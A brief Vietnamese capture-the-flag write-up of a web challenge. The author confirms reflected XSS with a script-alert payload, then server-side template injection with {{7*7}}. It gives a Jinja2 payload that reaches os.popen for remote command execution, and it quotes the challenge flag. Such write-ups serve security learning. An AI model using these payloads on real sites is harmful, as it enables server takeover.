Thông tin duy nhất ta có ở bài này là dòng "Hello ! What is your ?name= ?!" ,
truyền thử param `name=test12345` ta được "Hello test12345!". 
Nhận thấy web in ra màn hình giá trị truyền vào qua param `name` : 

Khả năng đầu tiên mình nghĩ đến là XSS.
Test thử với payload `name=<script>alert(document.domain)</script>` 

![Test XSS](https://i.imgur.com/sizrVhr.png) 

Đúng là dính XSS,nhưng làm gì tiếp giờ ??? 

Chuyển hướng khác,nhận thấy trong response có thông tin về server dựng bằng Python 

![Response](https://i.imgur.com/CQHpEkQ.png) 

Test thử SSTI với payload `name={{7*7}}` thì được "Hello 49!" 

Oke rồi,giờ RCE để lấy flag thôi. 

Payload `name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<COMMAND>').read() }}` 

FLAG: CyWeb{w3b_3asy_sst1}
